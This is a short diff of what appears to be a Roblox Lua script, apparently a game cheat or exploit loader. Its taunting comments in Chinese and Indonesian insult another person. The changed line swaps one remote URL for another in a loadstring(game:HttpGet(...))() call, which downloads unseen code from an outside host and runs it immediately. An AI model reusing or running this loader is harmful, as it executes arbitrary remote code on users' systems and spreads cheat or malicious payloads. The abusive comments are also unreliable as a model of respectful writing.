@@ -5,4 +5,4 @@
 -- 混蛋 🖕🖕
 -- dasar idiot Dasar bahkan tidak bisa menulis kode 😂😂😂?????
 
-loadstring(game:HttpGet("https://api.obscuravm.com/scripts/2124444515789962776"))()
+loadstring(game:HttpGet("https://flowauth.net/v1/loaders/82f7d12d1bd710b5d624c689d95da626.lua"))()
